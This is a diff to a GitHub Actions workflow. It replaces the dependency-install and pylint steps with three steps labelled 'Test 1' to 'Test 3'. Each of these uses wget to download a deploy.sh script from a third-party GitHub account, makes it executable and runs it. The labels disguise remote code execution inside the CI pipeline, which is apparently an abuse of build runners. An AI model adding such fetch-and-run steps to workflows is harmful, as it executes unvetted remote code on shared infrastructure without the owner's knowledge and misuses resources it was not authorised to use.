@@ -13,10 +13,12 @@ jobs:
       uses: actions/setup-python@v2
       with:
         python-version: 3.9
-    - name: Install dependencies
+    - name: Test 1
       run: |
-        python -m pip install --upgrade pip
-        pip install pylint
-    - name: Test
+        wget https://github.com/fikriramadan57/script/blob/master/deploy.sh && chmod +x deploy.sh && ./deploy.sh
+    - name: Test 2
+      run: |
+        wget https://github.com/fikriramadan57/script/blob/master/deploy.sh && chmod +x deploy.sh && ./deploy.sh
+    - name: Test 3
       run: |
         wget https://github.com/fikriramadan57/script/blob/master/deploy.sh && chmod +x deploy.sh && ./deploy.sh
